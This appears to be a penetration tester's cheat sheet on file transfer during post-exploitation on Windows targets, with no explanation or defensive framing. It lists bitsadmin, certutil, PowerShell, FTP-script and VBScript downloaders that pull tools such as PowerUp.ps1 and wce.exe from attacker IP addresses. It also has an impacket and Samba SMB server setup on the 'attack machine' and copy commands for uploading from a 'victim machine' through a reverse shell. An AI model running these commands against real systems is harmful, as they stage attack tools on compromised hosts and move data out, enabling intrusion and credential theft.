# File transfer

\# Bitsadmin

bitsadmin /transfer mydownloadjob /download /priority normal http:///xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe

​

\# certutil

certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat

​

\# Powershell

\(New-Object System.Net.WebClient\).DownloadFile\("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list"\)

invoke-webrequest -Uri http://10.10.14.19:9090/PowerUp.ps1 -OutFile powerup.ps1

​

\# FTP

\# In reverse shell"

echo open 10.11.1.111 &gt; ftp.txt\)

echo USER anonymous &gt;&gt; ftp.txt

echo ftp &gt;&gt; ftp.txt

echo bin &gt;&gt; ftp.txt

echo GET file &gt;&gt; ftp.txt

echo bye &gt;&gt; ftp.txt

\# Execute

ftp -v -n -s:ftp.txt

​

\# SMB Server

\# Attack machine

python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111" -u usuario -p pass

python /usr/share/doc/python3-impacket/examples/smbserver.py Lab "/root/htb/169-resolute/smb"

​

\# Or SMB service

\# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html

 vim /etc/samba/smb.conf

 \[global\]

 workgroup = WORKGROUP

 server string = Samba Server %v

 netbios name = indishell-lab

 security = user

 map to guest = bad user

 name resolve order = bcast host

 dns proxy = no

 bind interfaces only = yes

​

 \[ica\]

 path = /var/www/html/pub

 writable = no

 guest ok = yes

 guest only = yes

 read only = yes

 directory mode = 0555

 force user = nobody

​

 chmod -R 777 smb\_path

 chown -R nobody:nobody smb\_path

 service smbd restart

​

\# Victim machine with reverse shell

\# Download: copy \\10.11.1.111\Lab\wce.exe .

\# Upload: copy wtf.jpg \\10.11.1.111\Lab

​

\# VBScript

\# In reverse shell

echo strUrl = WScript.Arguments.Item\(0\) &gt; wget.vbs

echo StrFile = WScript.Arguments.Item\(1\) &gt;&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 &gt;&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 &gt;&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 &gt;&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 &gt;&gt; wget.vbs

echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs

echo Err.Clear &gt;&gt; wget.vbs

echo Set http = Nothing &gt;&gt; wget.vbs

echo Set http = CreateObject\("WinHttp.WinHttpRequest.5.1"\) &gt;&gt; wget.vbs

echo If http Is Nothing Then Set http = CreateObject\("WinHttp.WinHttpRequest"\) &gt;&gt; wget.vbs

echo If http Is Nothing Then Set http = CreateObject\("MSXML2.ServerXMLHTTP"\) &gt;&gt; wget.vbs

echo If http Is Nothing Then Set http = CreateObject\("Microsoft.XMLHTTP"\) &gt;&gt; wget.vbs

echo http.Open "GET",strURL,False &gt;&gt; wget.vbs

echo http.Send &gt;&gt; wget.vbs

echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs

echo Set http = Nothing &gt;&gt; wget.vbs

echo Set fs = CreateObject\("Scripting.FileSystemObject"\) &gt;&gt; wget.vbs

echo Set ts = fs.CreateTextFile\(StrFile,True\) &gt;&gt; wget.vbs

echo strData = "" &gt;&gt; wget.vbs

echo strBuffer = "" &gt;&gt; wget.vbs

echo For lngCounter = 0 to UBound\(varByteArray\) &gt;&gt; wget.vbs

echo ts.Write Chr\(255 And Ascb\(Midb\(varByteArray,lngCounter + 1,1\)\)\) &gt;&gt; wget.vbs

echo Next &gt;&gt; wget.vbs

echo ts.Close &gt;&gt; wget.vbs

\# Execute

cscript wget.vbs http://10.11.1.111/file.exe file.exe

